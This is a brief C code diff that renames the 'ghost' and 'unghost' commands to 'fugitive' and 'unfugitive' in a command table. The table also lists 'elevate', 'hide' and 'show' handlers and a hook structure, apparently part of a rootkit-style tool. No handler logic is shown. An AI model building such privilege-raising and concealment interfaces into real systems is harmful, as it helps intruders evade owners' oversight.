@@ -29,8 +29,8 @@ static struct iface_command iface__commands[] = {
     .handler = (iface_command_handler_t) &elevate
   },
   (struct iface_command) {
-    .command = "ghost",
-    .handler = (iface_command_handler_t) &ghost
+    .command = "fugitive",
+    .handler = (iface_command_handler_t) &fugitive
   },
   (struct iface_command) {
     .command = "hide",
@@ -41,8 +41,8 @@ static struct iface_command iface__commands[] = {
     .handler = (iface_command_handler_t) &show
   },
   (struct iface_command) {
-    .command = "unghost",
-    .handler = (iface_command_handler_t) &unghost
+    .command = "unfugitive",
+    .handler = (iface_command_handler_t) &unfugitive
   }
 };
 static struct sctm_hook iface__hook = {
